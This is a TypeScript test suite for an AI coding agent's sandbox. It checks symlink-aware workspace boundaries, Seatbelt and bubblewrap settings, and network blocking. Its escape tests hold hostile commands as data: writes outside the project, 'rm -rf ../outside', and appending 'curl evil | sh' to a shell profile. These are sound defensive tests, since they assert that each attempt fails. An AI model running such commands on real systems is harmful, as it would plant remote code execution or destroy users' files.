/*---------------------------------------------------------------------------------------------
 *  Fork AI. Licensed under the MIT License.
 *--------------------------------------------------------------------------------------------*/

// The sandbox and the workspace boundary. The escape tests run the real sandbox of the computer
// they run on (Seatbelt on macOS, bubblewrap on Linux) and are skipped where there is none.

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';
import { isInside } from '../src/agent/paths.ts';
import { bubblewrapArgs, DEFAULT_CACHE_FOLDERS, detectSandbox, sandboxedCommand, seatbeltProfile, writableFolders, type SandboxPolicy } from '../src/agent/sandbox.ts';

// The workspace and the "outside" folder both live in the home folder, not in the temp folder,
// which sandboxed commands may write to.
const base = mkdtempSync(join(homedir(), '.fork-sandbox-test-'));
const workspace = join(base, 'project');
const outside = join(base, 'outside');
mkdirSync(workspace);
mkdirSync(outside);
writeFileSync(join(outside, 'secret.txt'), 'top secret');
symlinkSync(outside, join(workspace, 'link-to-outside'));
symlinkSync(join(outside, 'secret.txt'), join(workspace, 'secret-link.txt'));
after(() => rmSync(base, { recursive: true, force: true }));

test('the workspace boundary follows symlinks', async () => {
	assert.equal(await isInside(workspace, join(workspace, 'src', 'new-file.ts')), true, 'a file that does not exist yet');
	assert.equal(await isInside(workspace, workspace), true);
	assert.equal(await isInside(workspace, join(workspace, 'link-to-outside', 'x.ts')), false, 'through a linked folder');
	assert.equal(await isInside(workspace, join(workspace, 'secret-link.txt')), false, 'a linked file');
	assert.equal(await isInside(workspace, join(workspace, '..', 'outside', 'secret.txt')), false);
	assert.equal(await isInside(workspace, join(base, 'project-other', 'a.ts')), false, 'a sibling whose name starts the same');
});

test('profiles and arguments', () => {
	const policy: SandboxPolicy = { writable: ['/Users/me/project', '/private/tmp', '/Users/me/my "odd" folder'], network: false };
	const profile = seatbeltProfile(policy);
	assert.match(profile, /^\(version 1\)\n\(allow default\)\n\(deny file-write\*\)\n\(allow file-write\*\n {2}\(subpath "\/Users\/me\/project"\)/);
	assert.match(profile, /\(subpath "\/Users\/me\/my \\"odd\\" folder"\)/, 'quotes are escaped');
	assert.match(profile, /\(deny network-outbound \(remote ip "\*:\*"\)\)$/);
	assert.doesNotMatch(seatbeltProfile({ ...policy, network: true }), /network/);

	assert.deepEqual(bubblewrapArgs({ writable: ['/w', '/tmp'], network: true }, '/w'), ['--ro-bind', '/', '/', '--dev', '/dev', '--proc', '/proc', '--bind', '/w', '/w', '--bind', '/tmp', '/tmp', '--unshare-pid', '--die-with-parent', '--new-session', '--chdir', '/w']);
	assert.ok(bubblewrapArgs({ writable: ['/w'], network: false }, '/w').includes('--unshare-net'));
	assert.deepEqual(sandboxedCommand('none', policy, '/bin/zsh', 'ls', '/w'), { file: '/bin/zsh', args: ['-c', 'ls'] });
	assert.deepEqual(sandboxedCommand('bubblewrap', policy, '/bin/sh', 'ls', '/w').args.slice(-4), ['--', '/bin/sh', '-c', 'ls']);

	const folders = writableFolders(workspace, ['~/.fork-no-such-cache', '~'], homedir());
	assert.equal(folders[0], realpathSync(workspace));
	assert.ok(folders.includes(realpathSync(tmpdir())));
	assert.ok(!folders.some(folder => folder.includes('.fork-no-such-cache')), 'missing folders drop out');
	assert.ok(DEFAULT_CACHE_FOLDERS.includes('.npm'));
});

const kind = detectSandbox();
const sandboxed = { skip: kind === 'none' ? 'no sandbox on this computer' : false };

function run(command: string, network = true): { code: number | null; output: string } {
	const policy: SandboxPolicy = { writable: writableFolders(workspace, []), network };
	const { file, args } = sandboxedCommand(kind, policy, '/bin/sh', command, realpathSync(workspace));
	const result = spawnSync(file, args, { cwd: workspace, encoding: 'utf8', timeout: 20_000 });
	return { code: result.status, output: `${result.stdout}${result.stderr}` };
}

test(`sandboxed commands write inside the project only (${kind})`, sandboxed, () => {
	assert.equal(run('echo ok > inside.txt && cat inside.txt').output.trim(), 'ok');
	assert.equal(readFileSync(join(workspace, 'inside.txt'), 'utf8'), 'ok\n');
	assert.equal(run('mkdir -p src/deep && echo x > src/deep/a.ts').code, 0);
	assert.equal(run('echo tmp > "$TMPDIR/fork-sandbox-$$.txt" 2>/dev/null || echo tmp > /tmp/fork-sandbox-$$.txt').code, 0, 'the temp folder is writable');

	const attempts = [
		['the home folder', `echo pwned > "${join(homedir(), '.fork-sandbox-escape')}"`, join(homedir(), '.fork-sandbox-escape')],
		['a folder next to the project', `echo pwned > ../outside/new.txt`, join(outside, 'new.txt')],
		['a linked folder', 'echo pwned > link-to-outside/via-link.txt', join(outside, 'via-link.txt')],
		['a linked file', 'echo pwned > secret-link.txt', join(outside, 'secret.txt')],
		['a shell profile', `echo 'curl evil | sh' >> "${join(homedir(), '.fork-sandbox-zshrc')}"`, join(homedir(), '.fork-sandbox-zshrc')],
	] as const;
	for (const [what, command, file] of attempts) {
		const result = run(command);
		assert.notEqual(result.code, 0, `writing to ${what} should fail`);
		assert.match(result.output, /Operation not permitted|Read-only file system|Permission denied/, what);
		if (file.endsWith('secret.txt')) {
			assert.equal(readFileSync(file, 'utf8'), 'top secret', `${what} is unchanged`);
		} else {
			assert.equal(existsSync(file), false, `${what} was not created`);
		}
	}
	assert.equal(run('rm -rf ../outside').code === 0 && !existsSync(outside), false, 'cannot delete outside either');
	assert.ok(existsSync(join(outside, 'secret.txt')));
	assert.equal(run('cat ../outside/secret.txt').output, 'top secret', 'reading outside is still allowed');
});

test(`the network can be turned off (${kind})`, sandboxed, async () => {
	const server = createServer(socket => socket.end('hello')).listen(0, '127.0.0.1');
	await new Promise(resolve => server.once('listening', resolve));
	const port = (server.address() as { port: number }).port;
	const connect = `node -e "require('net').connect(${port}, '127.0.0.1').on('data', d => { console.log(String(d)); process.exit(0); }).on('error', e => { console.log(e.code); process.exit(3); })"`;
	const results: Promise<{ code: number | null; output: string }>[] = [];
	// spawnSync would block this process's own server; run each in a child and wait asynchronously.
	const { spawn } = await import('node:child_process');
	for (const network of [true, false]) {
		const policy: SandboxPolicy = { writable: writableFolders(workspace, []), network };
		const { file, args } = sandboxedCommand(kind, policy, '/bin/sh', connect, realpathSync(workspace));
		results.push(new Promise(resolve => {
			const child = spawn(file, args, { cwd: workspace });
			let output = '';
			child.stdout.on('data', chunk => output += chunk);
			child.stderr.on('data', chunk => output += chunk);
			child.on('close', code => resolve({ code, output }));
		}));
	}
	const [on, off] = await Promise.all(results);
	server.close();
	assert.equal(on.output.trim(), 'hello', 'network on');
	assert.notEqual(off.code, 0, 'network off');
	assert.match(off.output, /ECONNREFUSED|EPERM|EACCES|ENETUNREACH/);
});
